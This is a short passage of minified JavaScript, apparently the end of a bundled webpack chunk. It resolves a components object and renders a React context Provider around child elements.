e.components?e.components(o):e.components||o:i(e.components),r.createElement(s.Provider,{value:n},e.children)}}}]);